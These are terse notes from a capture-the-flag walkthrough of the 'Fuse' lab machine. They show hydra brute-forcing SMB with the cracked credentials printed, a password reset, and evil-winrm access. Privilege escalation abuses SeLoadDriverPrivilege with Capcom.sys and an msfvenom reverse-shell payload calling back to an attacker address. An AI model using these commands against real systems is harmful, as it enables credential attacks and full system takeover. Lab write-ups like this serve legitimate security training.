- found domain in port 80 + all the usual ldap smb winrm
- opened the website and found a printer logger with usernames who initiated the print jobs and file names of printed documents 
- so made a user list with the usernames and a pass list with the file names
- ran hydra on smb and got three sets of creds all common pass Fabricorp01
 # Hydra v9.0 run at 2020-06-20 01:33:55 on fuse.htb smb (hydra -L users.txt -P passes.txt -o hydra_smb.txt smb://fuse.htb)
[445][smb] host: fuse.htb   login: tlavel   password: Fabricorp01
[445][smb] host: fuse.htb   login: bhult   password: Fabricorp01
[445][smb] host: fuse.htb   login: bnielson   password: Fabricorp01
- tried to connect to services but got logon failure because passes had expired 
- Googled the error and found smbpasswd tool that could reset smb pass
- echo -e "Fabricorp01\nPassword00\nPassword00"|sudo smbpasswd -U bhult -r fuse.htb && rpcclient -U 'FABRICORP\bhult'%'Password00' -c enumprinters 10.10.10.193
- got pass $fab@s3Rv1ce$1
- hit smb with medusa using the all_users.txt and got pass $fab@s3Rv1ce$1
- evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb
- Got user
- found that svc-print has a SeLoadDriverPrivilege priv
- can abuse by loading malicious driver
- need to plant malicious driver and then execute its exploit to create system shell
- create payload using msfvenom -p windows/shell/reverse_tcp LHOST=10.10.15.51 LPORT=4444 -o exe > shell.exe
- compile exploitcapcom from github in visual studio 2019 after pointing cmd spawning line to payload shell.exe in C:\Users\svc-print\Documents\toship\shell.exe
    in  new tab in msfconsole,
        use exploit/multi/handler
        set payload windows/shell/reverse_tcp
        set lhost=10.10.15.51
        set lport=4444
        run
- back in winrm upload toship.zip
- Expand-Archive -LiteralPath ./toship.zip -DestinationPath .
- cd toship
- ./EOPLOADDRIVER Myserve C:\Users\svc-print\Documents\toship\Capcom.sys
